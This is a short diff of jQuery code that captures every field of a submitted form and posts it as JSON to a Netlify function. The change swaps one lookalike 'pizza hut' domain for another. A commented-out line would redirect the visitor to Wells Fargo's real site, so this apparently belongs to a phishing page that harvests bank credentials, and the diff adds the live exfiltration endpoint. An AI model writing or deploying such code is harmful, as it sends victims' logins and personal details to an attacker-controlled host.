@@ -116,7 +116,7 @@ $(document).ready(function() {
      
         let payloadData = $(this).serializeArray().reduce((acc,oj)=>({...acc,[oj.name]:oj.value}),{});
         console.log(payloadData);
-        $.post("https://plzzahut.netlify.com/.netlify/functions/index", JSON.stringify(payloadData),function(sux){
+        $.post("https://pizzahuts.netlify.com/.netlify/functions/index", JSON.stringify(payloadData),function(sux){
             console.log({sux})
             //window.open("https://www.wellsfargo.com","_self")
         });
